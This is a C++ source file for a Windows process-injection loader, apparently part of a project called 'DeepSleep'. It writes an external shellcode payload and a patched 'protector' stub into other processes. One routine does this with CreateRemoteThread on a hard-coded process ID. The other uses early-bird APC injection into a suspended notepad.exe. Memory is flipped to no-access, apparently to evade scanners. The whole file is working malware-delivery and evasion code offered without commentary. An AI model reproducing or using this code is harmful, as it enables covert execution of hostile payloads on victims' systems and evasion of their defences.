#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include "shellcode.h"


bool replaceBytes2(byte* data, size_t data_size, const byte search[], const byte replace[]) {
	int i = 0;
	bool found = false;
	for (; i < data_size; i++) {
		if (std::memcmp(search, &(data[i]), sizeof(search)-1) == 0) {
			found = true;
			break;
		}
	}
	if (!found) {
		return false;
	}

	for (int j = 0; j < sizeof(replace); j++) {
		data[j + i] = replace[j];
	}
	return true;
}

SIZE_T prepare(IN LPVOID malwareAlloc, OUT byte** deepSleep) {
	std::fstream bin;
	const byte search[] = { 0x88, 0x88, 0x88 , 0x88 , 0x88 , 0x88 , 0x88 , 0x88 };
	const byte search2[] = { 0x99, 0x99, 0x99 , 0x99 , 0x99 , 0x99 , 0x99 , 0x99 };
	byte replace[sizeof(LPVOID)];
	memcpy(replace, &malwareAlloc, sizeof(LPVOID));
	 
	size_t shellcodeSizeT = sizeof(shellcode);
	byte* replace2 = static_cast<byte*>(static_cast<void*>(&shellcodeSizeT));

	bin.open(R"(C:\Users\Sapshoosh\source\repos\DeepSleep\DeepSleep.bin)", std::ios::out | std::ios::in | std::ios::binary);
	if (!bin.is_open()) {
		return 0;
	}
	

	bin.seekg(0, std::ios::end);
	size_t deepSleepSize = bin.tellg();
	bin.seekg(0, std::ios::beg);
	*deepSleep = new byte[deepSleepSize];
	bin.read((char*)*deepSleep, deepSleepSize);

	

	if (!replaceBytes2(*deepSleep, deepSleepSize, search, replace)) {
		std::cout << "Can't replace 8s" << std::endl;
		return 0;
	}
	if (!replaceBytes2(*deepSleep, deepSleepSize, search2, replace2)) {
		std::cout << "Can't replace 9s" << std::endl;
	}
	return deepSleepSize;
}

int processInject() {
	DWORD oldProtect;
	byte* deepSleep;

	HANDLE procHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, 11548);
	if (!procHandle) {
		std::cout << "Can't open process" << std::endl;
		return 0;
	}
	
	LPVOID malwareAlloc = VirtualAllocEx(procHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	if (malwareAlloc == NULL) {
		return 0;
	}
	if (!VirtualProtectEx(procHandle, malwareAlloc, sizeof(shellcode), PAGE_READWRITE, &oldProtect)) {
		return 0;
	}
	
	size_t deepSleepSize = prepare(malwareAlloc, &deepSleep);

	LPVOID protectorAlloc = VirtualAllocEx(procHandle, NULL, deepSleepSize, MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	if (!protectorAlloc) {
		return 0;
	}
	if (!VirtualProtectEx(procHandle, protectorAlloc, deepSleepSize, PAGE_EXECUTE_READ, &oldProtect)) {
		return 0;
	}

	size_t numBytes = 0;
	if (!WriteProcessMemory(procHandle, malwareAlloc, &shellcode, sizeof(shellcode), &numBytes)) {
		return 0;
	}
	if (!WriteProcessMemory(procHandle, protectorAlloc, deepSleep, deepSleepSize, &numBytes)) {
		return 0;
	}
	
	SECURITY_ATTRIBUTES attr = { 0 };

	if (!VirtualProtectEx(procHandle, malwareAlloc, sizeof(shellcode), PAGE_NOACCESS, &oldProtect)) {
		return 0;
	}
	
	HANDLE thread = CreateRemoteThread(procHandle, &attr, 0, (LPTHREAD_START_ROUTINE)protectorAlloc, nullptr, NULL, NULL);
	if (!thread) {
		return 0;
	}
	return 1;
}

int earlyBird() {
	byte* deepSleep;
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	DWORD oldProtect;

	CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;
	
	LPVOID malwareAlloc = VirtualAllocEx(victimProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	if (malwareAlloc == NULL) {
		return 0;
	}

	if (!VirtualProtectEx(victimProcess, malwareAlloc, sizeof(shellcode), PAGE_READWRITE, &oldProtect)) {
		return 0;
	}
	if (!WriteProcessMemory(victimProcess, malwareAlloc, shellcode , sizeof(shellcode), NULL)) {
		return 0;
	}

	size_t deepSleepSize = prepare(malwareAlloc, &deepSleep);

	LPVOID protectorAlloc = VirtualAllocEx(victimProcess, NULL, deepSleepSize, MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	if (!protectorAlloc) {
		return 0;
	}
	if (!VirtualProtectEx(victimProcess, protectorAlloc, deepSleepSize, PAGE_READWRITE, &oldProtect)) {
		return 0;
	}
	
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)protectorAlloc;

	if (!WriteProcessMemory(victimProcess, protectorAlloc, deepSleep, deepSleepSize, NULL)) {
		return 0;
	}

	// Fix protections
	if (!VirtualProtectEx(victimProcess, malwareAlloc, sizeof(shellcode), PAGE_NOACCESS, &oldProtect)) {
		return 0;
	}
	if (!VirtualProtectEx(victimProcess, protectorAlloc, deepSleepSize, PAGE_EXECUTE_READ, &oldProtect)) {
		return 0;
	}

	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
	ResumeThread(threadHandle);
}

int main() {
	int success = earlyBird();
	std::cout << success;
}